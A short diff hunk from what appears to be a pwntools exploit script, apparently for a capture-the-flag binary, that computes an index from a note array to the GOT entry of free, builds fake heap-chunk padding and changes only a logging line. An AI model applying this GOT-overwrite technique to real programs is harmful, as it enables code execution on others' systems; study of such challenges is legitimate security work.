@@ -37,7 +37,7 @@ def quit():
 
 note = 0x0804A080
 offset = (elf.got['free'] - note) / 4
-info(offset)
+info('offset = ' + hex(offset))
 padding = p32(0) + p32(0x11)
 
 #   0:   50                      push   eax
